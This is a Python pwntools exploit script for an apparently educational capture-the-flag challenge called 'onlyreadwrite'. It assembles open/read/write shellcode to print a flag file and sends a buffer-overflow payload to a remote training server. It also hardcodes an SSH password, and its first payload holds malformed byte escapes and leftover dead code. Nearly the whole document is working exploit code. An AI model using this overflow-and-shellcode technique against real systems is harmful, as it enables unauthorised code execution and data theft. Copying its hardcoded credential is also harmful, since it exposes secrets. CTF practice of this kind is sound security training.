
from pwn import *
from getpass import *
import logging

#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

host = "acidburn"

ip = "127.0.0.1"
path = "/challenges/shellcode/onlyreadwrite/"
#prt = int(input(" insert "+host+"'s port to connect to:"))
prt=3022
#pwd = getpass("insert "+host+"'s password:")
pwd="0607991337"#hardcoded for convenience, please remove later

print("Connecting to "+host+" at "+ip+" to execute syscall")

ssh_p = ssh(host,ip,password=pwd,port= prt,cache= True)

process = "."+path+"onlyreadwrite"
process = "."+path+"orw"

#r = ssh_p.process(process)
r = remote("bin.training.jinblack.it",2006)

#r= gdb.debug([process], ssh = ssh_p,gdbscript =''' handle SIGALRM nostop noprint nopass
#                                                   b *0x40090d
#                                                   continue
#                                                   ''')

#c = gdb.attach(r,gdbscript =''' handle SIGALRM nostop noprint nopass
#                                                   b *main
#                                                  b *0x40090d
#                                                  finish
#                                                  si
#                                                   ''')
#./flag in hex = 2e2f666c6167

CODE_='''
        mov rsp ,0x0100
        mov rbx ,0x002e2f666c6167
        push rbx
        mov rdi,rbx
        mov rsi ,0x00400
        mov rdx , rsi
        mov rax, 0x02
        syscall
      '''
shellcode= asm(CODE_, arch="amd64")
print(len(shellcode))
#please note that write syscall returns the fd of
payload =  b"\x90"*8
payload =  b"\xd8\xf5\xff\xff\xff\xff\xff\x7f"
payload += shellcode
payload += b"\x90"*(4072-len(shellcode))#buffe
payload += b"\x01\x02\x03\0x04\x05\xc0\x20\x60"
payload += b"\x00\x00\x00\0x0c\x0d\x0e\x0f\x11"
print(len(payload))


#please note that this binary doesn't seem to work, while the one on ODF's website gets solved by this
buffer_addr = 0x006020c0
CODE_ = '''
    jmp flag_addr
    start:
/*opens the flag*/
    mov rax, 0x02
    pop r9
    mov rdi, r9
    mov rsi, 0x0
    mov rdx, 0x0
    syscall
    /*read the flag*/
    mov rdi, rax
    mov rax, 0x0
    mov rsi, r9
    mov rdx, 0x100
    syscall
    /*write flag to stdout*/
    mov rdi, 0x1
    mov rsi, r9
    mov rax, 0x1
    syscall
    jmp end
    flag_addr:
    call start
    end:
'''
shellcode= asm(CODE_, arch="amd64")+b'./flag\x00'
print(len(shellcode))
input("Press key to open a file : ")
payload = shellcode.ljust(1016, b'\x90') + p64(buffer_addr)

r.send(payload)


r.interactive()
#from this point on the connection opens a shell for stdin/stdout
